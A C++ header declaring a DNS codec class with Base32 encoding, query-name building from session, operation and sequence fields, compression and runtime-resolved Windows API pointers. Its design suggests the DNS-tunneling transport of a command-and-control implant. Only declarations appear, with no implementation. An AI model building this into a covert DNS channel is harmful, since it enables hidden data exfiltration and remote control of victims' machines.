#pragma once

#include <windows.h>
#include "ApiDefines.h"

#define DECL_API(x) decltype(x) * x

// DNS Codec function pointers structure
struct DNSCODECFUNC {
    DECL_API(LocalAlloc);
    DECL_API(LocalFree);
};

class DnsCodec {
public:
    // Constants
    static const ULONG kSeqXorMask    = 0x39913991;
    static const ULONG kMaxLabelSize  = 63;
    static const ULONG kBase32BufSize = 2048;

    // Encoding
    static ULONG Base32Encode(const BYTE* src, ULONG srcLen, CHAR* dst, ULONG dstSize);
    static ULONG Base32Decode(const CHAR* src, ULONG srcLen, BYTE* dst, ULONG dstSize);
    static int   Base64Decode(const CHAR* src, int srcLen, BYTE* dst, int dstMax);

    // DNS Name building
    static void ToHex32(ULONG value, CHAR out[9]);
    static void BuildQName(const CHAR* sid, const CHAR* op, ULONG seq, ULONG idx, const CHAR* dataLabel, const CHAR* domain, CHAR* out, ULONG outSize);
    static int  EncodeName(const CHAR* host, BYTE* buf, int bufSize);
    static BOOL BuildDataLabels(const BYTE* src, ULONG srcLen, ULONG labelSize, CHAR* out, ULONG outSize);

    // Compression (miniz)
    static BOOL Compress(const BYTE* inBuf, ULONG inLen, BYTE** outBuf, ULONG* outLen);
    static BOOL Decompress(const BYTE* inBuf, ULONG inLen, BYTE** outBuf, ULONG expectedLen);

    // Operators
    static void* operator new(size_t sz);
    static void operator delete(void* p) noexcept;

private:
    // Private constants
    static const CHAR kBase32Alphabet[];
    static const int  kBase64DecodeTable[];

    DNSCODECFUNC* functions = NULL;
};

